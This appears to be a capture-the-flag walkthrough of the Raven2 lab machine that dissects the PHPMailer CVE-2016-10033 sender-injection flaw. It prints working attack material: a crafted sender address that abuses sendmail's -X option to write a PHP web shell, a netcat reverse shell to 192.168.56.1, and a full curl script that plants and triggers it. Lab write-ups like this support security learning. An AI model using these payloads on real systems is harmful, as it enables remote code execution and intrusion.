### Raven2 - Remote Command Execution 

#### Intro

Within this walkthrough, I will skip any part not related to the web application exploitation, but for sake of consistency I would briefly explain what (and why) I skip.

Raven2 web application is made on the top of WordPress, and a vulnerability affecting the application can be found analysing a bunch of files only

#### Vulnerability Discovery

Running a <code>find /var/www/html/ -type -f -regex .*php</code> give us the generic structure of the application. The first thing to note is that the first level of the application contains merely html files, except one, contact.php. To give you the ability to review it, the admin put a zipped version of the file (a backup?) for you to download.

<pre><code>
root@Raven:/var/www/html# ls -l
total 232
-rw-r--r-- 1 root     root     13265 Aug 13  2018 about.html
<strong>-rw-r--r-- 1 root     root     10441 Aug 13  2018 contact.php
-rw-r--r-- 1 root     root      3384 Aug 12  2018 contact.zip</strong>
drwxr-xr-x 4 root     root      4096 Aug 12  2018 css
-rw-r--r-- 1 root     root     35226 Aug 12  2018 elements.html
drwxr-xr-x 2 root     root      4096 Aug 12  2018 fonts
drwxr-xr-x 5 root     root      4096 Aug 12  2018 img
-rw-r--r-- 1 root     root     16819 Aug 13  2018 index.html
drwxr-xr-x 3 root     root      4096 Aug 12  2018 js
drwxr-xr-x 4 root     root      4096 Aug 12  2018 scss
drwxr-xr-x 7 root     root      4096 Aug 12  2018 Security - Doc
-rw-r--r-- 1 root     root     11114 Nov  9  2018 service.html
-rw-r--r-- 1 root     root     15449 Aug 13  2018 team.html
drwxrwxrwx 7 root     root      4096 Jan 19 20:06 vendor
drwxrwxrwx 5 root     root      4096 Nov  9  2018 wordpress
</code></pre>

Within the file, we can note the following piece of code, that loads the PHPMailer plugin, creates a message from user input parameters without any form of validation and tries to send it:

```php
 <?php
if (isset($_REQUEST['action'])){
    $name=$_REQUEST['name'];
    $email=$_REQUEST['email'];
    $message=$_REQUEST['message'];
    if (($name=="")||($email=="")||($message=="")){
        echo "There are missing fields.";
    }else{
        require 'vendor/PHPMailerAutoload.php';
        $mail = new PHPMailer;
        $mail->Host = "localhost";
        $mail->setFrom($email, 'Vulnerable Server');
        $mail->addAddress('admin@vulnerable.com', 'Hacker');
        $mail->Subject  = "Message from $name";
        $mail->Body     = $message;
        if(!$mail->send()) {
            echo 'Message was not sent.';
            echo 'Mailer error: ' . $mail->ErrorInfo;
        } else {
            echo 'Message has been sent.';
        }
    }
}
?>
```

The version of the PHPMailer installed on raven is the 5.2.17 (observable from /var/www/html/vendor/changelog.md).
Moreover, accessing the file /var/www/html/vendor/SECURITY.md, it's possible to see that this version is affected by a known vulnerability.

<pre><code>
tester@Raven:# cat vendor/changelog.md  | head -n 3
# ChangeLog
## Version <strong>5.2.17</strong> (December 9th 2016)

tester@Raven:# cat vendor/SECURITY.md
# Security notices relating to PHPMailer
Please disclose any vulnerabilities found responsibly - report any security problems found to the maintainers privately.
PHPMailer versions prior to <strong>5.2.18</strong> (released December 2016) are vulnerable to [CVE-2016-10033](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033) a remote code execution vulnerability, responsibly reported by [Dawid Golunski](https://legalhackers.com).
</code></pre>

Ignoring the fact that a public available exploit is available for PHPMailer, let's dig deeper into its implementation. 

Following, we will dissect the vulnerability known as [CVE-2016-10033](https://github.com/opsxcq/exploit-CVE-2016-10033), trying to figure it on our own. The steps that we will follow to exploit the sendmail routine can be summarised as following:

1. Locate the vulnerable function
2. Bypass the validation mechanism
3. Reach Remote Code Execution on the machine

#### Locate the vulnerable function

We'll start analysing `PHPMailerAutoload.php`, which is only a loader, as its name suggests, which aim is loading class.* files within the module directory. We're mainly interested in the `class.phpmailer.php` file, which contains the `send()` function called in `contact.php`. The send function, below, calls two other functions, `preSend` and `postSend`.

```php
<?php
public function send()
{
    try {
        if (!$this->preSend()) {
            return false;
        }
        return $this->postSend();
    } catch (phpmailerException $exc) {
        $this->mailHeader = '';
        $this->setError($exc->getMessage());
        if ($this->exceptions) {
            throw $exc;
        }
        return false;
    }
}
```
`PreSend` is the function that will prepare the message in a way that is ready to be sent. We will take this function into more consideration later, trying to find a way to bypass parameter filtering.

`PostSend`, instead, is the function that actually sends the message. It's crucial to understand the flow to the vulnerability. From its implementation we can see that different sub-routines are used to send the mail, basing on the value of the "Mailer" variable. At the start of the file, we can file that this variable is statically set to "mail". 

Note: To rapidly check for that, it's easy to add a logging routine just after the case 'mail', seeing that it's hit when a mail is sent from the contact us page.

```php
<?php
public function postSend()
{
    try {
        // Choose the mailer and send through it
        switch ($this->Mailer) {
            case 'sendmail':
            case 'qmail':
                return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody);
            case 'smtp':
                return $this->smtpSend($this->MIMEHeader, $this->MIMEBody);
            <>case 'mail':
                return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
            default:
                $sendMethod = $this->Mailer.'Send';
                if (method_exists($this, $sendMethod)) {
                    return $this->$sendMethod($this->MIMEHeader, $this->MIMEBody);
                }

                return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
        }
    } catch (phpmailerException $exc) {
        $this->setError($exc->getMessage());
        $this->edebug($exc->getMessage());
        if ($this->exceptions) {
            throw $exc;
        }
    }
    return false;
}
```

As observable in `mailSend` function code, snippet below, the sender value is passed as it is in a sprintf function, without any validation. That makes it a very good candidate for a possible exploit.
Then, the program flow is passed to `mailPassthru`.

```php
<?php
 protected function mailSend($header, $body)
    {
        $toArr = array();
        foreach ($this->to as $toaddr) {
            $toArr[] = $this->addrFormat($toaddr);
        }
        $to = implode(', ', $toArr);

        $params = null;
        //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver
        <>if (!empty($this->Sender)) {
--------->   $params = sprintf('-f%s', $this->Sender);
        }
        if ($this->Sender != '' and !ini_get('safe_mode')) {
            $old_from = ini_get('sendmail_from');
            ini_set('sendmail_from', $this->Sender);
        }
        $result = false;
        if ($this->SingleTo and count($toArr) > 1) {
            foreach ($toArr as $toAddr) {
                $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);
                $this->doCallback($result, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From);
            }
        } else {
--------->  $result = $this->mailPassthru($to, $this->Subject, $body, $header, $params);
            $this->doCallback($result, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From);
        }
        if (isset($old_from)) {
            ini_set('sendmail_from', $old_from);
        }
        if (!$result) {
            throw new phpmailerException($this->lang('instantiate'), self::STOP_CRITICAL);
        }
        return true;
    }    
```

Once reached `mailPassthru`, the code flow is passed to the standard PHP `mail` function, which is known to be susceptible to code injection attacks. As the affected parameter is `$param`, it seems to be claer that the function is vulnerable to an injection attack only if running in 'non safe' mode. Snippet below:

```php
1. <?php
2. //Can't use additional parameters in safe_mode
3. //@link http://php.net/manual/en/function.mail.php
4. if (ini_get('safe_mode') or !$this->UseSendmailOptions or is_null($params)) 5. {
6.     $result = @mail($to, $subject, $body, $header);
7. } else {
8.     $result = @mail($to, $subject, $body, $header, >$params);
9. }
```


To test if we're running in safe mode, let's run from raven terminal:
```
tester@Raven:# php -r 'echo ini_get("safe_mode") ? "TRUE"."\n" : "FALSE"."\n";'
FALSE
```

So we know that we can reach that injection point. Before continuing further with the process of bypass the encoding I would like to insert here a note about PHP `mail` exploitation. The following paragraph is copied directly (without any modification) from the fantastic work of <strong>opsxcq</strong>, who previously wrote a post on this vulnerability, found by <strong>Dawid Golunski</strong>, and develop a vulnerable docker container to play with it:

--- BEGIN NOTE

### Notes about PHP mail() function exploitation

The exploitation of PHP mail() function isn't a new thing, but it still alive and people still using it. To explain how it works, lets look at how mail() function is defined:

```php
bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] )
```

There are several exploitation methods for different results, we will focus on the exploitation of the **5th parameter** to get Remote Code Execution (RCE). The parameter `$additional_parameters` is used to pass additional flags as command line options to the program configured to send the email. This configuration is defined by the `sendmail_path` variable.

A security note from [php official documentation](http://php.net/manual/en/function.mail.php):

> The additional\_parameters parameter can be used to pass additional flags as command line options to the program configured to be used when sending mail, as defined by the sendmail_path configuration setting. For example, this can be used to set the envelope sender address when using sendmail with the -f sendmail option.

> This parameter is escaped by escapeshellcmd() internally to prevent command execution. escapeshellcmd() prevents command execution, but allows to add additional parameters. For security reasons, it is recommended for the user to sanitize this parameter to avoid adding unwanted parameters to the shell command.

Considering the additional parameters that can be injectected we will use `-X` to exploit this flaw. More about the `-X` parameter

    -X logfile
    Log all traffic in and out of mailers in the indicated log file. This should only be used as a last resort for debugging mailer bugs. It will log a lot of data very quickly.

There are also some other interesting parameters that you should know that exist:

    -Cfile
    Use alternate configuration file. Sendmail gives up any enhanced (set-user-ID or set-group-ID) privileges if an alternate configuration file is specified.

And

    -O option=value
    Set option to the specified value. This form uses long names.

And for `-O` option, the `QueueDirectory` is the most interesting option there, this option select the directory in which to queue messages.

If you want to read the whole list of parameters and options, just `man sendmail` or read it online [here](https://linux.die.net/man/8/sendmail.sendmail)

Based on this information, and the ability to control at least one of the other parameters, we can exploit the host. Bellow the steps for a successful exploitation:

 * Control `$additional_parameters` and another `mail()` parameter
 * Know a **writeable** directory on target host which is accessible via the target system and user (www-data for example). Usually this directory can be anything bellow `webroot` (aka /var/www/html for another systems, /www for this example)
 * Any PHP payload that you want, we are using a simple `system()` payload in this example, with a spice of base64 and some special characters `|` to make it easier to parse. 
 * Just assembly everything together!

Remember that the `-X` option will write the log file, that will contain among the log information your PHP payload, in the directory that you will inform. An example of a vulnerable PHP code:

```php
$to = 'hacker@server.com';
$subject = '<?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?>';
$message = 'Pwned';
$headers = '';
$options = '-OQueueDirectory=/tmp -X/www/backdoor.php';
mail($to, $subject, $message, $headers, $options);
```

If you execute the code above, it will create a log file in the `/www/backdoor.php`, this is the essence of this exploit.

--- END NOTE

Ok, that's awesome, now we know we can exploit the injection point to reach remote code execution. But that is so simple? 
Let's do one step back and take a look at what kind of validation is performed in `preSend` function:

```php
1. <?php
2. public function preSend()
3. {
4.
5.        ...SNIPPED...
6.
7.        // Validate From, Sender, and ConfirmReadingTo addresses
8.        foreach (array('From', 'Sender', 'ConfirmReadingTo') as $address_kind) {
9.             $this->$address_kind = trim($this->$address_kind);
10.            if (empty($this->$address_kind)) {
11.                continue;
12.            }
13.            $this->$address_kind = $this->punyencodeAddress($this->$address_kind);
14.            if (!$this->validateAddress($this->$address_kind)) {</strong>
15.                $error_message = $this->lang('invalid_address') . ' (punyEncode) ' . $this->$address_kind;
16.                $this->setError($error_message);
17.                $this->edebug($error_message);
18.                if ($this->exceptions) {
19.                    throw new phpmailerException($error_message);
20.                }
21.                return false;
22.            }
23.        }
24.
25.        ...SNIPPED...
26.
27.    }
28. }    
```
The validation is performed in three steps:

* Null check (line 10.)
* punyencodeAddress (line 13.)
* validateAddress (line 14.)

We can clearly observe that punyencodeaddress won't actually do anything more than checking if the mail address contains a "@" and if the domain is utf-8 encoded:

```php
<?php
public function punyencodeAddress($address)
{
    // Verify we have required functions, CharSet, and at-sign.
    if ($this->idnSupported() and
        !empty($this->CharSet) and
        ($pos = strrpos($address, '@')) !== false) {
        $domain = substr($address, ++$pos);
        // Verify CharSet string is a valid one, and domain properly encoded in this CharSet.
        if ($this->has8bitChars($domain) and @mb_check_encoding($domain, $this->CharSet)) {
            $domain = mb_convert_encoding($domain, 'UTF-8', $this->CharSet);
            if (($punycode = defined('INTL_IDNA_VARIANT_UTS46') ?
                idn_to_ascii($domain, 0, INTL_IDNA_VARIANT_UTS46) :
                idn_to_ascii($domain)) !== false) {
                return substr($address, 0, $pos) . $punycode;
            }
        }
    }
    return $address;
}
```

The function validate address, instead, does the heavy job validating the address name, differentiating four validation types:

* pcre8 regex, used if `PCRE_VERSION` is defined and > 8.0.2
* pcre regex (backward compatibility with older pcre), used if `PCRE_VERSION` is defined and <= 8.0.2
* html5 (used in html5 to validate mail addresses), not used
* php, uses standard PHP filter_var, used if `PCRE_VERSION` is not defined and PHP version >= 5.2.0
* noregex (just force a lower bound for length and check if '@' is present), used if `PCRE_VERSION` is not defined and PHP version < 5.2.0

Let's check if PCRE_VERSION is defined in PHP and the PHP version by running:

```
tester@Raven:# php -r 'echo (version_compare(PCRE_VERSION,"8.0.3") ? "TRUE" : "FALSE");'
TRUE

tester@Raven:# # php --version
PHP 5.6.36-0+deb8u1 (cli) (built: Jun 26 2018 17:31:29)
Copyright (c) 1997-2016 The PHP Group
Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies
    with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2016, by Zend Technologies
```

Ok, so now we know that the flow of the program will choose `pcre8` as the validation regex.

Let's take a deeper look at the regex used:

```php
<?php

$regex= '/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' .
        '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' .
        '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
        '([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' .
        '(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9\-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9\-]*[a-z0-9])?)' .
        '(?>(?1)\.(?!(?1)[a-z0-9\-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' .
        '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' .
        '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
        '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD';
```

The important thing to note is that this regex, although being compliant with the RFC, allows a wide range of characters to be used within the mail address.
We can exploit it? Let's write a small php tester:
```php
<?php

$regex = '/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' .
                    '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' .
                    '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
                    '([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' .
                    '(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9\-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9\-]*[a-z0-9])?)' .
                    '(?>(?1)\.(?!(?1)[a-z0-9\-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' .
                    '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' .
                    '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD';

$address = (string)'"test chars:\" -A/=/a/b/c test" @test.com';

print "[*] Testing the following address:\n\t" . $address . "\n";

$res = preg_match($regex,$address);
echo ((bool)$res ? "TRUE\n" : "FALSE\n");

?>
```

And run it:
```
tester@Raven:# php test.php
[*] Testing the following address:
        "test the following:\" -A/=/a/b/c test" @test.com
TRUE
```

#### Exploitation

We just need to craft a payload string that would allow us to write a log in a file reachable from the web server. Ideally, we will be able to inject php log into the file and use it as a vector to achieve code execution, as explained previously in the "Notes about PHP mail() function exploitation".

Following the above example, we can modify the address from this:

```
$address = (string)'"test chars:\" -A/=/a/b/c test" @test.com';
```
to this:
```
$address = (string)'"injection\" -OQueueDirectory=/tmp -X/var/www/html/shell.php server" @pwnd.com';
```

If we run again the tester, we will see that this payload as well matches the validation regex: 

```
tester@Raven:# php test.php
[*] Testing the following address:
        "injection\" -OQueueDirectory=/tmp -X/var/www/html/shell.php server" @pwnd.com
TRUE
```

When called by PHP mail function, the sendmail program would look like it was called from the command like in the following way:
```
tester@Raven:# sendmail -f"injection\" -OQueueDirectory=/tmp -X/var/www/html/shell.php server" @pwnd.com

```

However, if anyone tries to execute the command this way, he will see that it won't work. To make it work properly, it's necessary to launch it this way:
```bash
tester@Raven:# $(printf '/usr/sbin/sendmail -f"injection\" -OQueueDirectory=/tmp -X/var/www/html/shell.php server" @pwnd.com') 

```
Killing the command with `Ctrl+C`, and listing the files within the directory, 
it's observable that the file shell.php has been created, registering the output of the command. At this point, the last thing to do is to choose where to put the PHP shell payload. We can control two additional part of the sendmail command, as observable from the contact.php:

```php
$name=$_REQUEST['name'];
$message=$_REQUEST['message'];
...
$mail->Subject  = "Message from $name";
$mail->Body     = $message;
```

Any of the two can be chosen to inject the backdoor payload. To test it, it is possible to launch the sendmail directly from the command line and craft the mail manually:

```
tester@Raven:# $(echo '/usr/sbin/sendmail -f"d3adc0de\" -OQueueDirectory=/tmp -X/var/www/html/shell.php server" @gmail.com')
To: Hacker <admin@vulnerable.com>
Subject: Message from ME
Header: Date: Mon, 20 Jan 2020 20:23:17 +1100
From: Vulnerable Server <"d3adc0de\" -OQueueDirectory=/tmp -X/var/www/html/shell.php server" @gmail.com>
PWND!!<?php system('nc -e /bin/bash 192.168.56.1 444'); ?>
.
tester@Raven:# cat shell.php | grep '<?php'
29395 <<< PWND!!<?php system('nc -e /bin/bash 192.168.56.1 444'); ?>
29395 >>> PWND!!<?php system('nc -e /bin/bash 192.168.56.1 444'); ?>
29395 >>> PWND!!<?php system('nc -e /bin/bash 192.168.56.1 444'); ?>
29395 >>> PWND!!<?php system('nc -e /bin/bash 192.168.56.1 444'); ?>

```
The backdoor was successfully created.

##### Wrapping up

The final payload, as it looks after tweaking:

```sh
#!/bin/sh
echo "[*] Staring Listener on port 444"
gnome-terminal -- nc -lvkp 444 2>/dev/null

echo "[*] Writing shell on the filesystem"
curl -ksi -x $'http://127.0.0.1:8080' \
-X $'POST' -H $'Content-Type: multipart/form-data' \
-F $'action=submit' \
-F $'subject=No Subject' \
-F $'message=TEST' \
--form-string $'name=<?php system("nc -e /bin/bash 192.168.56.1 444");?>'\
--form-string $'email="injection\\\" -OQueueDirectory=/tmp -X/var/www/html/shell.php server" @pwnd.com' \
$'http://raven.local/contact.php' &>/dev/null

echo "[*] Triggering the reverse shell"
curl -ksi http://raven.local/shell.php -x http://127.0.0.1:8080 &>/dev/null
echo "[+] Done"
```

#### Conclusion

Very good machine to learn how to review code and find an injection point, if you don't choose to take the easy route and go with the public available exploit, of course! The level of complexity is close to AWAE level.
